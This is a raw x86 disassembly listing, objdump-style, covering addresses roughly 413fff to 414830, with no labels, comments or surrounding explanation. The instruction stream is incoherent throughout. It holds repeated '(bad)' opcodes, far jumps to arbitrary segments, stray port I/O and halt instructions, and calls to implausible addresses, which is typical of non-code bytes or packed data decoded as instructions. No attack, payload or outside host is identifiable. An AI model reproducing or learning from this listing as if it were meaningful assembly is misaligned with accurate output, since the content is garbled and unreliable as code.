  413fff:	cmp    ecx,ebx
  414001:	add    BYTE PTR [ecx-0x2caa9],al
  414007:	retf   
  414008:	xchg   BYTE PTR [ecx-0x75],dl
  41400b:	xchg   edi,eax
  41400c:	stc    
  41400d:	call   0x5716fb13
  414012:	mov    DWORD PTR [edi-0x7],esi
  414015:	adc    al,0x57
  414017:	bound  esi,QWORD PTR [edi-0x38]
  41401a:	call   0x45b12d
  41401f:	inc    esp
  414020:	outs   dx,DWORD PTR ds:[esi]
  414021:	mov    ecx,0xeef3311c
  414026:	mov    edi,0x2c98b
  41402b:	bound  ebx,QWORD PTR [eax]
  41402d:	cs mov ebp,0x89f06300
  414033:	clc    
  414034:	push   ecx
  414035:	pop    ss
  414036:	cmp    ch,0xf7
  414039:	lods   al,BYTE PTR ds:[esi]
  41403a:	icebp  
  41403b:	(bad)  
  41403c:	cmp    ebp,DWORD PTR [ebp-0x5d874ec]
  414042:	add    eax,0x486ca344
  414047:	dec    eax
  414048:	xchg   ecx,eax
  414049:	je     0x414069
  41404b:	aaa    
  41404c:	jnp    0x414005
  41404e:	cmp    al,0xca
  414050:	mov    bl,0x93
  414052:	dec    edi
  414053:	dec    edi
  414054:	loope  0x414058
  414056:	cld    
  414057:	dec    edi
  414058:	lock ret 
  41405a:	test   al,0x16
  41405c:	add    edx,eax
  41405e:	add    BYTE PTR [ecx+0x74ae4632],cl
  414064:	and    ecx,DWORD PTR [esp+eax*2+0x24]
  414068:	jle    0x4140e2
  41406a:	xchg   DWORD PTR [edi],eax
  41406c:	or     al,dl
  41406e:	mov    edi,edi
  414070:	or     eax,0x2a8ac64c
  414075:	jmp    0x41404f
  414077:	jns    0x414076
  414079:	out    dx,eax
  41407a:	lods   al,BYTE PTR ds:[esi]
  41407b:	shl    BYTE PTR [ebx-0x3e],cl
  41407e:	add    BYTE PTR [ecx-0x3f7e4d59],cl
  414084:	outs   dx,DWORD PTR ds:[esi]
  414085:	ror    BYTE PTR [ebp-0x585d79a4],0x5
  41408c:	loope  0x414090
  41408e:	in     al,0x86
  414090:	(bad)  es:0x9cda00e4
  414097:	push   edx
  414098:	ret    0xd8bd
  41409b:	jmp    0x268a:0xf5fd1e8a
  4140a2:	std    
  4140a3:	in     eax,0x86
  4140a5:	push   ds
  4140a6:	std    
  4140a7:	or     eax,0x16623251
  4140ac:	loopne 0x414123
  4140ae:	fcom   st(5)
  4140b0:	pop    ds
  4140b1:	je     0x4140cc
  4140b3:	jmp    0x6ec0:0x66dd0f88
  4140ba:	daa    
  4140bb:	adc    bl,BYTE PTR [esi]
  4140bd:	jmp    0x414086
  4140bf:	jmp    DWORD PTR [esi-0x765a9bd6]
  4140c5:	aaa    
  4140c6:	fmul   QWORD PTR [esi-0x15ef267c]
  4140cc:	cs pushf 
  4140ce:	sbb    ax,0x3a0c
  4140d2:	daa    
  4140d3:	sub    al,0x3
  4140d5:	bound  ebx,QWORD PTR [ebp+0x2a]
  4140d8:	das    
  4140d9:	js     0x414137
  4140db:	(bad)  
  4140dc:	fbld   TBYTE PTR [ebp-0x1d]
  4140df:	pop    esp
  4140e0:	dec    eax
  4140e1:	xchg   ch,ch
  4140e3:	mov    dh,0x11
  4140e5:	mov    eax,0xebab94da
  4140ea:	cdq    
  4140eb:	jmp    0x65e2bf3
  4140f0:	sbb    al,0xe5
  4140f2:	sbb    al,0xce
  4140f4:	adc    edi,ebx
  4140f6:	cmc    
  4140f7:	sbb    dh,BYTE PTR [eax]
  4140f9:	add    BYTE PTR [esi-0x7],al
  4140fc:	fs aas 
  4140fe:	push   0x29
  414100:	add    bh,BYTE PTR [ebp+0x7ee9da23]
  414106:	and    dl,BYTE PTR [ecx-0x12]
  414109:	push   edx
  41410a:	xor    DWORD PTR [ecx],ebp
  41410c:	add    DWORD PTR [edx+ebp*1-0x3],esp
  414110:	and    BYTE PTR [ecx],al
  414112:	aaa    
  414113:	fwait
  414114:	add    ch,cl
  414116:	loop   0x4140d9
  414118:	cmp    DWORD PTR [edi],ebp
  41411a:	jns    0x41409f
  41411c:	mov    BYTE PTR [ebp-0x16fd346b],al
  414122:	popa   
  414123:	or     bl,al
  414125:	jb     0x414185
  414127:	shl    DWORD PTR ds:0x87d960a0,0xa6
  41412e:	leave  
  41412f:	add    ebx,edx
  414131:	call   0xcd96a397
  414136:	jno    0x414194
  414138:	iret   
  414139:	out    dx,al
  41413a:	out    0x9e,eax
  41413c:	add    ecx,ebp
  41413e:	popa   
  41413f:	bound  edi,QWORD PTR [ebp-0x3b]
  414142:	pop    ebp
  414143:	fs jne 0x414113
  414146:	and    BYTE PTR [edx-0x3c],bl
  414149:	mov    dh,0xea
  41414b:	ret    
  41414c:	addr16 (bad) 
  41414e:	fcomp  QWORD PTR [edi]
  414150:	in     al,0x1a
  414152:	mov    dh,0xd4
  414154:	push   ss
  414155:	int    0x57
  414157:	sbb    DWORD PTR [ecx],eax
  414159:	push   0xfffffffd
  41415b:	in     eax,0x8d
  41415d:	scas   al,BYTE PTR es:[edi]
  41415e:	add    BYTE PTR [eax],dl
  414160:	inc    esp
  414161:	adc    eax,0xe91fe4b9
  414166:	cdq    
  414167:	out    dx,al
  414168:	jmp    0x2d7f:0xd9a1d75c
  41416f:	pop    ebp
  414170:	pop    ecx
  414171:	cmp    al,0xe9
  414173:	aas    
  414174:	fld    QWORD PTR [eax+0x66d6e6b7]
  41417a:	loopne 0x414112
  41417c:	mov    esi,0xdd4bf375
  414181:	lea    esp,[esi+0x8e29cc]
  414187:	mov    ch,0x8e
  414189:	push   ecx
  41418a:	push   DWORD PTR [esi-0x34bfecd2]
  414190:	hlt    
  414191:	mov    DWORD PTR [edi+0x62],eax
  414194:	pop    ecx
  414195:	lds    ecx,FWORD PTR [edx*1-0x7d99fcac]
  41419c:	sub    bh,al
  41419e:	je     0x41414c
  4141a0:	hlt    
  4141a1:	adc    BYTE PTR [ebp-0x72ae877c],cl
  4141a7:	jne    0x414188
  4141a9:	push   eax
  4141aa:	push   DWORD PTR [esi-0x74bfecda]
  4141b0:	add    BYTE PTR [edx-0x3aa141b9],cl
  4141b6:	or     al,0xfb
  4141b8:	sbb    ah,dh
  4141ba:	add    ah,BYTE PTR [ebp+0x54]
  4141bd:	inc    ebx
  4141be:	adc    ah,BYTE PTR [ebp-0x3c]
  4141c1:	push   ds
  4141c2:	jne    0x4141c4
  4141c4:	lea    ebp,ds:0xe1510167
  4141ca:	xchg   DWORD PTR [esi-0x21],ecx
  4141cd:	daa    
  4141ce:	jmp    0x11ee896
  4141d3:	test   BYTE PTR [ebp+0x4474ff82],0x2d
  4141da:	add    DWORD PTR [bx+di],edx
  4141dd:	jmp    0xafe9:0x24494e87
  4141e4:	out    0xdc,al
  4141e6:	add    al,ch
  4141e8:	push   ebp
  4141e9:	inc    eax
  4141ea:	add    DWORD PTR [eax],eax
  4141ec:	and    eax,0x88124355
  4141f1:	mov    ds:0xc5448328,eax
  4141f6:	inc    edi
  4141f7:	pcmpeqd mm5,QWORD PTR [edi]
  4141fa:	(bad)  
  4141fb:	call   FWORD PTR [esi+edx*2-0x53]
  4141ff:	and    al,0x62
  414201:	hlt    
  414202:	add    eax,0x593b6200
  414207:	and    al,0x52
  414209:	xchg   ebx,eax
  41420a:	mov    ebp,0x81b03f37
  41420f:	inc    ebx
  414210:	ins    BYTE PTR es:[edi],dx
  414211:	mov    edi,0x74dfbf44
  414216:	cmp    BYTE PTR [ecx],dh
  414218:	int3   
  414219:	and    eax,0xfc6d16ee
  41421e:	mov    esi,0x55dc9069
  414223:	push   edx
  414224:	fisttp WORD PTR [ebx]
  414226:	jmp    0xf151425a
  41422b:	add    eax,0x66
  41422e:	lock jb 0x414232
  414231:	mov    dh,bh
  414233:	dec    DWORD PTR gs:[ebp-0x737c4fc6]
  41423a:	repz sbb DWORD PTR [ecx+0x560c9c2e],ecx
  414241:	jmp    0xd972dafe
  414246:	rol    BYTE PTR [eax],0x89
  414249:	xchg   esp,eax
  41424a:	dec    ecx
  41424b:	enter  0x6de8,0xd8
  41424f:	scas   eax,DWORD PTR es:[edi]
  414250:	std    
  414251:	jmp    0x3a552b54
  414256:	mov    eax,0x4945ffc8
  41425b:	ret    
  41425c:	pop    ebp
  41425d:	pushf  
  41425e:	xchg   ebp,eax
  41425f:	dec    ebx
  414260:	jg     0x414280
  414262:	and    eax,DWORD PTR ds:0x4006200
  414268:	add    BYTE PTR [ebx+0x6a245447],dl
  41426e:	ins    BYTE PTR es:[edi],dx
  41426f:	repz cmc 
  414271:	pop    ebx
  414272:	nop
  414273:	adc    BYTE PTR [ebx+0x43ffaca0],cl
  414279:	sbb    al,0xda
  41427b:	bnd jns 0x414220
  41427e:	fmul   st,st(6)
  414280:	leave  
  414281:	outs   dx,BYTE PTR ds:[esi]
  414282:	push   es
  414283:	mov    ds:0xa1fa763b,al
  414288:	cmp    ebp,DWORD PTR [esi-0xe]
  41428b:	mov    cl,0x3b
  41428d:	add    BYTE PTR [esi-0x22],dl
  414290:	data16 fwait
  414292:	xchg   BYTE PTR [esi-0x26],cl
  414295:	jle    0x414264
  414297:	sub    bl,BYTE PTR [edi+0x7b]
  41429a:	fcmovu st,st(2)
  41429c:	jmp    0xef5f0ca4
  4142a1:	add    ah,BYTE PTR [edx-0x40]
  4142a4:	clc    
  4142a5:	cmc    
  4142a6:	in     eax,dx
  4142a7:	rcr    ah,0x55
  4142aa:	mov    edx,0x9fb1c539
  4142af:	shl    ah,0x55
  4142b2:	mov    dl,BYTE PTR [esi+esi*4]
  4142b5:	mov    cl,0x8f
  4142b7:	xor    edx,DWORD PTR [ecx]
  4142b9:	(bad)  
  4142ba:	pop    esi
  4142bb:	fnstcw WORD PTR [edi*2-0x3f71a572]
  4142c2:	jne    0x414298
  4142c4:	jmp    0xdb58:0xe24edb59
  4142cb:	shr    BYTE PTR [edi+0x9],cl
  4142ce:	pop    edi
  4142cf:	mov    DWORD PTR [esi+0x3],ebx
  4142d2:	(bad)  
  4142d3:	fldenv [edi+eax*2+0x56]
  4142d7:	sub    al,BYTE PTR [eax]
  4142d9:	pop    es
  4142da:	mov    dl,0x60
  4142dc:	xor    al,0x9c
  4142de:	mov    ecx,0xde03e9be
  4142e3:	cwde   
  4142e4:	jecxz  0x41426d
  4142e6:	lock fldl2t 
  4142e9:	add    edi,DWORD PTR [eax+0x164774dd]
  4142ef:	inc    ecx
  4142f0:	ss xchg ecx,eax
  4142f2:	add    BYTE PTR [edx-0x2d66ff27],ah
  4142f8:	out    0x60,eax
  4142fa:	xlat   BYTE PTR ds:[ebx]
  4142fb:	mov    eax,ds:0x622d7fd9
  414300:	pop    eax
  414301:	shr    esi,0xdd
  414304:	and    BYTE PTR [edx],al
  414306:	jmp    0x5c47826c
  41430b:	popf   
  41430c:	int    0x69
  41430e:	add    eax,0x990118f3
  414313:	adc    ch,al
  414315:	pusha  
  414316:	fbld   TBYTE PTR [ecx]
  414318:	fnstcw WORD PTR [edi+0x25]
  41431b:	bound  ebx,QWORD PTR [eax-0x3f]
  41431e:	mul    ch
  414320:	add    al,0x2
  414322:	jmp    0xd645a588
  414327:	xor    DWORD PTR [ebp+0x2],esi
  41432a:	jmp    0xa887a390
  41432f:	xor    BYTE PTR [edi],bh
  414331:	and    al,0x19
  414333:	pop    ss
  414334:	mov    ds:0xd3c50ee9,eax
  414339:	cld    
  41433a:	mov    eax,gs:0x614584e5
  414340:	fld    DWORD PTR [eax]
  414342:	adc    ebx,DWORD PTR [ebp+0x60]
  414345:	inc    esi
  414346:	popf   
  414347:	adc    DWORD PTR [eax+0x46],esp
  41434a:	dec    ebp
  41434b:	adc    esi,edx
  41434d:	push   ss
  41434e:	and    eax,0x72011978
  414353:	push   0x58
  414355:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414356:	mov    ebp,0xfcd51300
  41435b:	jmp    0x6a4ee13e
  414360:	and    esi,ebx
  414362:	push   eax
  414363:	ins    BYTE PTR es:[edi],dx
  414364:	mov    ah,0xd
  414366:	sti    
  414367:	push   esi
  414368:	repnz sar edx,0x49
  41436c:	repnz aam 0x67
  41436f:	add    BYTE PTR [edi+0x52],dh
  414372:	inc    eax
  414373:	mov    esp,0x348853fb
  414378:	push   ebp
  414379:	mov    esi,edi
  41437b:	call   0x3fc050
  414380:	mov    eax,DWORD PTR [ebx]
  414382:	mov    ebp,0x135b0400
  414387:	add    ebx,edi
  414389:	(bad)  
  41438a:	cmp    BYTE PTR [ebp-0x6b],0xd6
  41438e:	or     eax,0xd7d787
  414393:	add    cl,dh
  414395:	xlat   BYTE PTR ds:[ebx]
  414396:	data16 add BYTE PTR [esi+0x1b],al
  41439a:	aad    0x50
  41439c:	inc    eax
  41439d:	cwde   
  41439e:	jmp    0x11d607e
  4143a3:	lea    edi,[esi]
  4143a5:	(bad)  
  4143a8:	xchg   esp,eax
  4143a9:	sub    eax,0x6eaf4e88
  4143ae:	mov    bl,0xe0
  4143b0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143b1:	or     BYTE PTR [esi],0xb6
  4143b4:	inc    esi
  4143b5:	inc    edx
  4143b6:	add    dh,BYTE PTR [bx+di-0x2c]
  4143ba:	xchg   esi,eax
  4143bb:	sub    BYTE PTR [eax],al
  4143bd:	jns    0x414395
  4143bf:	add    BYTE PTR [ebx+0x64e956ca],cl
  4143c5:	dec    edi
  4143c6:	cli    
  4143c7:	sub    edx,eax
  4143c9:	dec    edi
  4143ca:	imul   BYTE PTR [ecx]
  4143cc:	ret    0xe4f
  4143cf:	sub    al,dl
  4143d1:	pop    edi
  4143d2:	sbb    eax,DWORD PTR [edx+0x251175e8]
  4143d8:	sub    edi,ecx
  4143da:	rol    DWORD PTR [eax+0xd63bc1],1
  4143e0:	sub    ecx,DWORD PTR [ecx+0x4bb97fd2]
  4143e6:	(bad)  
  4143e7:	add    BYTE PTR [esi+0x62],dl
  4143ea:	xchg   ecx,eax
  4143eb:	ja     0x4143fa
  4143ed:	fnstcw WORD PTR [eax]
  4143ef:	mov    edi,edi
  4143f1:	sbb    eax,0x8ed898c0
  4143f6:	rol    BYTE PTR [eax],0xe7
  4143f9:	(bad)  
  4143fa:	mov    edi,0x84e20000
  4143ff:	jno    0x414402
  414401:	ins    DWORD PTR es:[edi],dx
  414402:	inc    ebp
  414403:	mov    BYTE PTR [eax],al
  414405:	(bad)  
  414406:	rcl    BYTE PTR [esi+0x4f],0xd9
  41440a:	mov    edx,0xc0de8777
  41440f:	add    BYTE PTR [eax],al
  414411:	retf   0x3688
  414414:	add    BYTE PTR [edx-0x17],ah
  414417:	add    DWORD PTR [eax],0x62
  41441a:	shl    BYTE PTR [edi+0xd],0x2c
  41441e:	aaa    
  41441f:	jle    0x4143b1
  414421:	add    BYTE PTR [ebx-0x40],ah
  414424:	add    BYTE PTR [ebx-0x17af8be1],cl
  41442a:	add    edi,DWORD PTR [ebx+ebp*4]
  41442d:	std    
  41442e:	mov    ecx,0xe105782e
  414433:	test   al,0x24
  414435:	je     0x4144a2
  414437:	out    0xb6,eax
  414439:	jae    0x414435
  41443b:	aaa    
  41443c:	pop    ecx
  41443d:	or     BYTE PTR [ecx-0x45],bh
  414440:	mov    BYTE PTR [ebx+0x6a],0xc1
  414444:	stos   DWORD PTR es:[edi],eax
  414445:	jae    0x4144b1
  414447:	inc    edi
  414448:	js     0x4143da
  41444a:	arpl   ax,ax
  41444c:	add    BYTE PTR [esi+0x7a],dl
  41444f:	jo     0x4144cb
  414451:	std    
  414452:	pop    ebp
  414453:	ins    BYTE PTR es:[edi],dx
  414454:	ds mov ebx,edi
  414457:	mov    gs,WORD PTR [ebx+0x77f34dfd]
  41445d:	into   
  41445e:	cmp    cl,BYTE PTR [edi]
  414460:	mov    al,ds:0x6dda3dff
  414465:	ret    
  414466:	scas   al,BYTE PTR es:[edi]
  414467:	or     eax,0xd06e806d
  41446c:	push   ebx
  41446d:	scas   al,BYTE PTR es:[edi]
  41446e:	cmp    dl,BYTE PTR [ebx+eax*2+0x4]
  414472:	bound  edx,QWORD PTR [ebp+0x2a]
  414475:	aaa    
  414476:	dec    ecx
  414477:	fs jecxz 0x414440
  41447a:	mov    eax,ds:0xa2631ec1
  41447f:	fstp   DWORD PTR [esi+0x7b]
  414482:	jmp    0x16e9:0x3e9da
  414489:	push   ss
  41448a:	jl     0x41442d
  41448c:	mov    ebp,0x46dd045f
  414491:	sbb    cl,BYTE PTR [eax-0x510cba5e]
  414497:	adc    ch,BYTE PTR [esi-0x17]
  41449a:	add    esp,DWORD PTR [edx+0x5e]
  41449d:	lods   eax,DWORD PTR ds:[esi]
  41449e:	fwait
  41449f:	xor    al,cl
  4144a1:	idiv   bl
  4144a3:	mov    esp,0x9d4e43d0
  4144a8:	fwait
  4144a9:	out    0x3,al
  4144ab:	adc    DWORD PTR [esi+eax*8-0x7f],esp
  4144af:	mov    esi,0x56a069d1
  4144b4:	fsub   st(1),st
  4144b6:	add    ebp,ecx
  4144b8:	sbb    eax,0x43340806
  4144bd:	jmp    0x7d36:0x1dc16219
  4144c4:	shr    BYTE PTR [edi+0x37],1
  4144c7:	push   0x5e
  4144c9:	cs call 0x9c1e1534
  4144cf:	ss scas eax,DWORD PTR es:[edi]
  4144d1:	jmp    0x6d202fd9
  4144d6:	mov    ebx,0x36ed7ce
  4144db:	mov    eax,0x6e7600da
  4144e0:	bound  ecx,QWORD PTR [ebx-0x1b]
  4144e3:	mov    esp,0x91f12515
  4144e8:	rcr    edx,0x5c
  4144eb:	add    bh,bh
  4144ed:	int    0x88
  4144ef:	daa    
  4144f0:	(bad)  
  4144f1:	push   ebx
  4144f2:	(bad)  
  4144f3:	call   0xd8ea959
  4144f8:	push   ss
  4144f9:	mov    eax,0xd960b766
  4144fe:	das    
  4144ff:	sub    DWORD PTR [edx+eiz*2-0x2adc731a],edx
  414506:	add    BYTE PTR [edx+0x7256a87a],bh
  41450c:	jmp    0x414533
  41450e:	mov    BYTE PTR [eax-0x36],ah
  414511:	iret   
  414512:	cld    
  414513:	jmp    0xfcf7064e
  414518:	push   es
  414519:	into   
  41451a:	mov    dl,ch
  41451c:	rol    ch,cl
  41451e:	mov    BYTE PTR [ecx],dh
  414520:	jmp    0xd3e:0x3ce9fccf
  414527:	cmp    al,0x7
  414529:	in     al,dx
  41452a:	dec    esp
  41452b:	sti    
  41452c:	and    ecx,ebx
  41452e:	xchg   esi,esp
  414530:	fcom   QWORD PTR [edi+0x161ade75]
  414536:	add    eax,0x70cf896a
  41453b:	call   0xee029f67
  414540:	dec    eax
  414541:	dec    esp
  414542:	cmc    
  414543:	adc    al,0xcf
  414545:	jmp    0x414587
  414547:	sti    
  414548:	and    ecx,ebx
  41454a:	sbb    DWORD PTR [edi-0x1603305d],0x87dd2f00
  414554:	sbb    eax,0x85eb4a
  414559:	adc    al,BYTE PTR [edi]
  41455b:	push   eax
  41455c:	mov    edi,DWORD PTR [edx]
  41455e:	jb     0x4145a8
  414560:	push   0x43
  414562:	icebp  
  414563:	add    bh,bh
  414565:	not    BYTE PTR [edx]
  414567:	jle    0x4145ad
  414569:	dec    ebx
  41456a:	jle    0x41457c
  41456c:	cld    
  41456d:	sub    ebx,DWORD PTR [ebx]
  41456f:	add    DWORD PTR [ebx-0x74ef48f9],ecx
  414575:	mov    bl,0x57
  414577:	(bad)  
  414578:	je     0x4145ea
  41457a:	repz add BYTE PTR [ecx+0x45e5414],cl
  414581:	adc    cl,0x4b
  414584:	mov    eax,DWORD PTR [edx+0xbfffc66]
  41458a:	imul   ebx,DWORD PTR es:[esi],0x68011c08
  414591:	sti    
  414592:	fimul  DWORD PTR [eax]
  414594:	add    BYTE PTR [ebx+0x31],ah
  414597:	lock call FWORD PTR [esi+edx*2-0x3f]
  41459c:	jne    0x414546
  41459e:	push   ecx
  41459f:	into   
  4145a0:	call   0x3dec21
  4145a5:	inc    esi
  4145a6:	test   BYTE PTR [ebp+0x8],dh
  4145a9:	xor    bl,bl
  4145ab:	mov    esi,ecx
  4145ad:	adc    esp,edx
  4145af:	std    
  4145b0:	adc    BYTE PTR [ebx+eiz*1+0x58],ch
  4145b4:	pop    ebx
  4145b5:	add    cl,cl
  4145b7:	int    0xfc
  4145b9:	mov    al,BYTE PTR [edi-0x47]
  4145bc:	or     BYTE PTR [ebx+0x5551d19f],al
  4145c2:	gs (bad) 
  4145c4:	fst    DWORD PTR [edi+0x0]
  4145c7:	ins    BYTE PTR es:[edi],dx
  4145c8:	mov    bh,bl
  4145ca:	push   es
  4145cb:	xchg   ebp,eax
  4145cc:	jne    0x4145e6
  4145ce:	repnz sbb BYTE PTR ds:0x3a586210,ah
  4145d5:	lahf   
  4145d6:	(bad)  
  4145d7:	rcr    BYTE PTR [esi],0xff
  4145da:	jmp    0x79c8:0xb817e0fb
  4145e1:	inc    esp
  4145e2:	jle    0x41458c
  4145e4:	push   eax
  4145e5:	jmp    0x51472050
  4145ea:	xchg   ecx,eax
  4145eb:	xchg   ebx,eax
  4145ec:	push   ebx
  4145ed:	mov    DWORD PTR [esi+0x1031f0d4],ecx
  4145f3:	cmp    edi,DWORD PTR [eax+ebp*8+0x63c3c]
  4145fa:	jmp    0x9737c80e
  4145ff:	ins    DWORD PTR es:[edi],dx
  414600:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414601:	je     0x414641
  414603:	aam    0x7b
  414605:	dec    ebx
  414606:	bound  esp,QWORD PTR [esi-0x68]
  414609:	mov    dl,0xeb
  41460b:	rol    BYTE PTR [eax],0x89
  41460e:	jmp    0x2940:0xa17ea834
  414615:	and    al,0x86
  414617:	shr    BYTE PTR [esp+edi*1],0x0
  41461b:	jmp    0x98ca768d
  414620:	out    0x1a,eax
  414622:	jns    0x414687
  414624:	shl    BYTE PTR [edx],0x81
  414627:	mov    edx,0xe92c36a5
  41462c:	add    DWORD PTR ds:0x124a283,edx
  414632:	mov    DWORD PTR [edx+0x2a8b039a],ebx
  414638:	int3   
  414639:	push   ebp
  41463a:	mov    esp,DWORD PTR [eax]
  41463c:	or     ah,dh
  41463e:	(bad)  
  41463f:	push   ecx
  414640:	jb     0x414664
  414642:	aaa    
  414643:	jb     0x4145fc
  414645:	cmp    al,0xbf
  414647:	jmp    0xe9914b38
  41464c:	fdiv   DWORD PTR [eax-0x6d]
  41464f:	ins    DWORD PTR es:[edi],dx
  414650:	int    0xea
  414652:	push   esi
  414653:	jp     0x414672
  414655:	pop    edi
  414656:	stos   BYTE PTR es:[edi],al
  414657:	pop    edi
  414658:	popa   
  414659:	pushf  
  41465a:	fwait
  41465b:	outs   dx,BYTE PTR ds:[esi]
  41465c:	inc    ebx
  41465d:	sub    DWORD PTR [edx+0x4a1b94db],0xffffffa9
  414664:	xor    BYTE PTR [edi-0x41],ah
  414667:	outs   dx,BYTE PTR ds:[esi]
  414668:	xchg   edi,eax
  414669:	fiadd  DWORD PTR [ebx]
  41466b:	jecxz  0x41462a
  41466d:	push   es
  41466e:	push   edi
  41466f:	xchg   ecx,eax
  414670:	and    ebp,DWORD PTR [edi+0x2f]
  414673:	jle    0x414672
  414675:	mov    edx,0xa45e761d
  41467a:	sti    
  41467b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41467c:	pop    esi
  41467d:	scas   al,BYTE PTR es:[edi]
  41467e:	fild   WORD PTR [eax]
  414680:	jne    0x4146ab
  414682:	outs   dx,DWORD PTR ds:[esi]
  414683:	pushf  
  414684:	pop    es
  414685:	out    0x95,eax
  414687:	adc    DWORD PTR [edx-0x77b36f27],esp
  41468d:	fimul  DWORD PTR [edi-0x51a17405]
  414693:	fistp  QWORD PTR [ecx]
  414695:	sar    eax,0x64
  414698:	(bad)  
  414699:	fnstcw WORD PTR [edi+0x4]
  41469c:	dec    eax
  41469d:	in     eax,dx
  41469e:	je     0x4146df
  4146a0:	xchg   cl,dh
  4146a2:	cdq    
  4146a3:	test   dh,0x24
  4146a6:	fwait
  4146a7:	jne    0x414709
  4146a9:	pusha  
  4146aa:	sbb    al,0x9b
  4146ac:	mov    ebp,DWORD PTR [ebp-0x17]
  4146af:	add    ebx,ebx
  4146b1:	mov    cl,0x65
  4146b3:	int    0x2e
  4146b5:	inc    ecx
  4146b6:	shl    DWORD PTR [eax],cl
  4146b8:	inc    esi
  4146b9:	or     eax,0x2862375f
  4146be:	shr    BYTE PTR [ecx+0x7ce9dada],cl
  4146c4:	xchg   edx,eax
  4146c5:	pop    eax
  4146c6:	add    DWORD PTR [edi+0x62484d61],esi
  4146cc:	aaa    
  4146cd:	dec    ecx
  4146ce:	mov    BYTE PTR [eax],bl
  4146d0:	push   esi
  4146d1:	pop    eax
  4146d2:	repz adc al,0x62
  4146d5:	(bad)  
  4146d6:	hlt    
  4146d7:	and    BYTE PTR [edi+0x5a],0xc3
  4146db:	mov    ebp,0xe8777bf9
  4146e0:	popa   
  4146e1:	fidiv  WORD PTR [ebx-0x3c3aff57]
  4146e7:	jne    0x4146ab
  4146e9:	pop    edi
  4146ea:	add    BYTE PTR [eax],dh
  4146ec:	fwait
  4146ed:	test   eax,0x146cf2c6
  4146f2:	dec    eax
  4146f3:	and    esi,ebp
  4146f5:	mov    dl,0xc1
  4146f7:	xchg   BYTE PTR [eax+ecx*2-0x1c],al
  4146fb:	xchg   DWORD PTR [esi],esp
  4146fd:	xchg   edi,eax
  4146fe:	sbb    eax,0x996f0125
  414703:	cs jmp 0xcc8f:0x4de92923
  41470b:	cld    
  41470c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41470d:	cli    
  41470e:	test   ah,al
  414710:	loop   0x4146be
  414712:	dec    esp
  414713:	jmp    0xfe22:0x8812b3da
  41471a:	xor    BYTE PTR [esi+0xe],dh
  41471d:	or     esp,DWORD PTR [edx-0x3d]
  414720:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414721:	sbb    esi,DWORD PTR [eax]
  414723:	pop    eax
  414724:	push   0xffffffa2
  414726:	in     al,dx
  414727:	mov    esi,0x542861d9
  41472c:	bound  ecx,QWORD PTR [edx-0x378def0b]
  414732:	fnsave [ebx-0x218b3612]
  414738:	call   0x586a89e
  41473d:	outs   dx,BYTE PTR ds:[esi]
  41473e:	push   ebp
  41473f:	rol    DWORD PTR [eax],0x4e
  414742:	fidiv  DWORD PTR [ecx]
  414744:	shl    BYTE PTR [edx+0x158],0x8b
  41474b:	sub    DWORD PTR [ecx+0x30],ebp
  41474e:	mov    bh,dl
  414750:	add    BYTE PTR [ebx],dh
  414752:	int    0x29
  414754:	(bad)  
  414755:	xor    eax,0x450233
  41475a:	hlt    
  41475b:	(bad)  
  41475d:	adc    BYTE PTR [ebx+0x4fc07fd5],cl
  414763:	shr    BYTE PTR [edx+0x1],cl
  414766:	(bad)  
  414767:	cli    
  414768:	and    al,0x18
  41476a:	ror    BYTE PTR [esi-0x27c75117],0x0
  414771:	mov    ecx,DWORD PTR [ebx+0x3f75f34b]
  414777:	(bad)  
  414778:	mov    esp,0x404dddeb
  41477d:	add    al,bl
  41477f:	dec    ebp
  414780:	cdq    
  414781:	pushf  
  414782:	cli    
  414783:	(bad)  
  414784:	add    BYTE PTR [ebx+0x33],dl
  414787:	(bad)  
  414788:	outs   dx,DWORD PTR ds:[esi]
  414789:	add    BYTE PTR [ebx],cl
  41478b:	sub    cl,BYTE PTR [edx-0x251a5c32]
  414791:	add    ebx,edi
  414793:	dec    ebp
  414794:	retf   
  414795:	test   BYTE PTR [ebx],bh
  414797:	cli    
  414798:	sub    DWORD PTR [ebx+0x6a10ab0f],ecx
  41479e:	enter  0x7081,0x0
  4147a2:	cmp    BYTE PTR [esi+0x6b735009],dl
  4147a8:	jb     0x4147ab
  4147aa:	retf   
  4147ab:	and    eax,0x2e003069
  4147b0:	(bad)  
  4147b1:	add    BYTE PTR [edx+0x57],ch
  4147b4:	jb     0x41482b
  4147b6:	and    al,0x53
  4147b8:	dec    esi
  4147b9:	retf   
  4147ba:	call   0xffe78321
  4147bf:	xchg   ebp,eax
  4147c0:	xor    al,0xc5
  4147c2:	jae    0x414822
  4147c4:	inc    edi
  4147c5:	mov    bl,0x89
  4147c7:	pop    esp
  4147c8:	es push es
  4147ca:	std    
  4147cb:	push   edx
  4147cc:	iret   
  4147cd:	shr    cl,0x60
  4147d0:	aaa    
  4147d1:	mov    ebx,0x4a130c59
  4147d6:	ret    0xc056
  4147d9:	push   ecx
  4147da:	mov    DWORD PTR [esi+0x11],ecx
  4147dd:	js     0x4147de
  4147df:	scas   eax,DWORD PTR es:[edi]
  4147e0:	add    edi,DWORD PTR [eax-0x48]
  4147e3:	out    dx,al
  4147e4:	rol    BYTE PTR [eax],0x0
  4147e7:	lods   eax,DWORD PTR ds:[esi]
  4147e8:	icebp  
  4147e9:	ja     0x414836
  4147eb:	push   0xffffffd6
  4147ed:	add    BYTE PTR [ebx-0x17aac361],cl
  4147f3:	loop   0x414814
  4147f5:	push   es
  4147f6:	add    dh,bl
  4147f8:	push   DWORD PTR [eax]
  4147fa:	xor    ecx,ebp
  4147fc:	je     0x4147a2
  4147fe:	sub    DWORD PTR [ebx],0xffffffa4
  414801:	aam    0x7e
  414803:	or     eax,eax
  414805:	cld    
  414806:	lahf   
  414807:	bound  eax,QWORD PTR [ebx-0x11641824]
  41480d:	add    eax,0x820fe900
  414812:	test   BYTE PTR [eax],0x76
  414815:	(bad)  [ebx+0x4f]
  414818:	in     eax,0x64
  41481a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41481b:	mov    DWORD PTR [edi],ebp
  41481d:	mov    eax,0xe02ee84e
  414822:	add    eax,0x31ffe600
  414827:	or     eax,0x4f9cf9d9
  41482c:	nop
  41482d:	rol    BYTE PTR [eax],0x32
  414830:	mov    ds:0xa0c7465a,al
